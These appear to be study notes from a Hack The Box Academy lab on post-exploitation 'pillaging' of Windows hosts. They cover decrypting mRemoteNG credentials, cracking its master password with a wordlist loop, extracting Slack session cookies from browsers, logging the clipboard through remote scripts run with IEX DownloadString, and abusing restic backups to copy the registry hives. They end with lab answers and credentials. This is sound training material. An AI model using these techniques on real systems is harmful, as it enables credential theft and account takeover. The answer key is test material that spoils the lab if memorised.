# Pillaging
Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

## Data Sources
Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
  - Websites
  - File Shares
  - Databases
  - Directory Services (such as Active Directory, Azure AD, etc.)
  - Name Servers
  - Deployment Services
  - Certificate Authority
  - Source Code Management Server
  - Virtualization
  - Messaging
  - Monitoring and Logging Systems
  - Backups
- Sensitive Data
  - Keylogging
  - Screen Capture
  - Network Traffic Capture
  - Previous Audit reports
- User Information
  - History files, interesting documents (.doc/x,.xls/x,password./pass., etc)
  - Roles and Privileges
  - Web Browsers
  - IM Clients

## Installed Applications

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:\Program Files\Adobe\Acrobat DC\
CORSAIR iCUE 4 Software                             4.23.137          C:\Program Files\Corsair\CORSAIR iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:\Program Files\Google\Chrome\Application
Google Drive                                        60.0.2.0          C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
mRemoteNG                                           1.62              C:\Program Files\mRemoteNG
TeamViewer                                          15.31.5           C:\Program Files\TeamViewer
...SNIP...
```

### mRemoteNG
`mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in mRemoteNG and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

Discover mRemoteNG Configuration Files
```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

Let's look at the contents of the confCons.xml file.

```XML
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

We can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.

### Decrypt the Password with mremoteng_decrypt

```shellsession
masterofblafu@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```

### Decrypt the Password with mremoteng_decrypt and a Custom Master Password

```shellsession
masterofblafu@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA
```

### For Loop to Crack the Master Password with mremoteng_decrypt

```shellsession
masterofblafu@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                              
Spring2017
Spring2016
admin
Password: ASDki230kasd09fk233aDA
admin admin          
admins

<SNIP>
```

## Abusing Cookies to Get Access to IM Clients
### Copy Firefox Cookies Database

```powershell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

### Extract Slack Cookie from Firefox Cookies Database

```shellsession
masterofblafu@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

### Extract Cookie from Chromium-based browser
The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.

To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

```powershell
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "httpOnly": true,
    "name": "d",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
},
{
    "domain": ".slack.com",
    "hostOnly": false,
    "httpOnly": true,
    "name": "d-s",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": true,
    "storeId": null,
    "value": "1659023172"
},

<SNIP>

]

[*] Finished Google Chrome extraction.

[*] Done.
```

## Clipboard
We can use the Invoke-Clipboard script to extract user clipboard data. Start the logger by issuing the command below.

### Monitor the Clipboard with PowerShell

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

### Capture Credentials from the Clipboard with Invoke-ClipboardLogger

```powershell
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

## Roles and Services
### Attacking Backup Servers
[Restic](https://restic.net/) is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

To start working with restic, we must create a repository (the directory where backups will be stored). Restic checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.

### restic - Initialize Backup Directory

```powershell
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Then we can create our first backup.

### restic - Back up a Directory

```powershell
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved
```

If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

### restic - Back up a Directory with VSS

```powershell
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read
```

> Note: If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

We can also check which backups are saved in the repository using the snapshot command.

### restic - Check Backups Saved in a Repository

```powershell
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```

We can restore a backup using the ID.

### restic - Restore a Backup with ID

```powershell
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```

## Questions
RDP to 10.129.203.122 (ACADEMY-WINLPEPILLAGE-WIN01), with user `Peter` and password `Bambi123`
1. Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems? **Answer:**
   - Check for installed applications:
        ```powershell
        PS C:\Users\Peter> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
        PS C:\Users\Peter> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
        PS C:\Users\Peter> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

        DisplayName                                                        DisplayVersion  InstallLocation
        -----------                                                        --------------  ---------------
        DB Browser for SQLite                                              3.12.2          C:\Program Files\DB Browser for S...
        Google Chrome                                                      105.0.5195.127  C:\Program Files\Google\Chrome\Ap...
        Microsoft Edge                                                     105.0.1343.42   C:\Program Files (x86)\Microsoft\...
        Microsoft Edge Update                                              1.3.167.21
        Microsoft Edge WebView2 Runtime                                    105.0.1343.42   C:\Program Files (x86)\Microsoft\...
        Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29325 14.28.29325.2
        Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.24.28127 14.24.28127.4
        Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29325     14.28.29325
        Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29325        14.28.29325
        Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127     14.24.28127
        Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127        14.24.28127
        Mozilla Firefox (x64 en-US)                                        105.0.1         C:\Program Files\Mozilla Firefox
        Mozilla Maintenance Service                                        103.0.2
        mRemoteNG                                                          1.76.20.24615   C:\Program Files (x86)\mRemoteNG\
        Slack (Machine - MSI)                                              4.27.154.0
        Slack (Machine)                                                    4.27.154
        Update for Windows 10 for x64-based Systems (KB4023057)            2.67.0.0
        Update for Windows 10 for x64-based Systems (KB4480730)            2.55.0.0
        VMware Tools                                                       11.1.1.16303738 C:\Program Files\VMware\VMware To...
        XAMPP                                                              8.1.6-0         C:\xampp
        ```
2. Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace? **Answer: Princess01!**
   - Download the [mRemoteNG-Decrypt script](https://github.com/haseebT/mRemoteNG-Decrypt) locally on attack host
   - Start a RDP session with the Downloads folder as shared drive:
        ```shellsession
        $ xfreerdp /v:10.129.203.122 /u:Peter /p:Bambi123 /drive:share,/home/htb-ac-1863259/Downloads
        ```
   - Copy the C:\Users\Peter\AppData\Roaming\mRemoteNG\confCons.xml to our shared drive for local decryption:
        ```powershell
        PS C:\Users\Peter\AppData\Roaming\mRemoteNG> Copy-Item -Path .\confCons.xml -Destination "\\tsclient\share"
        ```
   - Decrypt the password:
        ```shellsession
        $ python poc.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="
        Password: Princess01!
        ```
3. Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag. **Answer: HTB{Stealing_Cookies_To_AccessWebSites}**\
   - Login as Grace:
        ```shellsession
        $ xfreerdp /v:10.129.203.122 /u:Grace /p:Princess01! /drive:share,/home/htb-ac-1863259/Downloads
        ```
   - Copy cookie database to our shared drive:
        ```powershell
        PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite \\tsclient\share
        ```
   - Extract slack's cookie:
        ```shellsession
        $ python cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
        (10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
        ```
   - Use that cookie to login and read the flag:
        ```
        Slacky Demo Chat Website 
        You have successfully logged in  
        FLAG: HTB{Stealing_Cookies_To_AccessWebSites} 
        Chat  
        jeff: Hi Grace, I'm testing the our internal Slack Demo Chat App  
        grace: Yeah, it's working fine, we just need to add some color.  
        jeff: Can you help me with that?  
        grace: Sure. Where's the source code?  
        jeff: It's in my computer, you can login with my creds Username: jeff and Password Webmaster001!  
        grace: Ok! I'll do it :)
        ```
4. Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer. **Answer: Superbackup!**
   - Login as Jeff:
        ```shellsession
        $ xfreerdp /v:10.129.203.122 /u:Jeff /p:Webmaster001! /drive:share,/home/htb-ac-1863259/Downloads
        ```
   - Password is stored in `%USERPROFILE%\Desktop\backup.conf`
5. Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer. **Answer:**
6. Optional. Use the hash with a Pass-The-Hash technique to log in as the Administrator. Mark DONE when complete. **Answer:**